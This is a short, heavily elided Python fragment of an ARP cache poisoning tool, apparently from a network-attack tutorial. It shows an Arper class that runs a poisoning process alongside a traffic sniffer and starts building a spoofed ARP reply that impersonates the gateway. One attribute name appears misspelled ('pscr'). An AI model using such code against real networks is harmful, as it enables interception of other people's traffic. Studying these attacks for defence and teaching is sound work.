...
# Returns the mac address of the target_ip
...
class Arper:
    ...
    def run(self):
        # We create 2 processes and run them. First one will poison the ARP cache and the second
        # one will watch the attack by sniffing network traffic
    ...
    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.pscr = self.gateway
